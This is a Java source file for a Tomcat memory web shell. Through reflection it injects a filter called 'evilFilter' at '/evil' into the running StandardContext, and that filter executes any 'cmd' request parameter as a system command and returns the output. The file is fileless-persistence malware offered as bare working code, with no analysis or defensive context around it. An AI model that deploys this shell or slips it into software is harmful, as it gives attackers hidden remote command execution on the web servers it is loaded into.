import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Map;
import java.util.Scanner;

public class TomcatFilterShell implements Filter {
    static{
        try{
            ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
            HttpServletRequest request = attributes.getRequest();
            ServletContext servletContext = request.getServletContext();
            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext= (ApplicationContext)appctx.get(servletContext);
            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
            Filter filter = new TomcatFilterShell();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(filter);
            filterDef.setFilterName("evilFilter");
            filterDef.setFilterClass(filter.getClass().getName());
            standardContext.addFilterDef(filterDef);
            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
            Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
            filterConfigsField.setAccessible(true);
            Map filterConfigs = (Map) filterConfigsField.get(standardContext);
            filterConfigs.put("evilFilter", filterConfig);
            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern("/evil");
            filterMap.setFilterName("evilFilter");
            filterMap.setDispatcher(DispatcherType.REQUEST.name());
            standardContext.addFilterMapBefore(filterMap);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public TomcatFilterShell(){

    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        if (servletRequest.getParameter("cmd") != null) {
            Process process = Runtime.getRuntime().exec(servletRequest.getParameter("cmd"));
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line+"\n");
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}
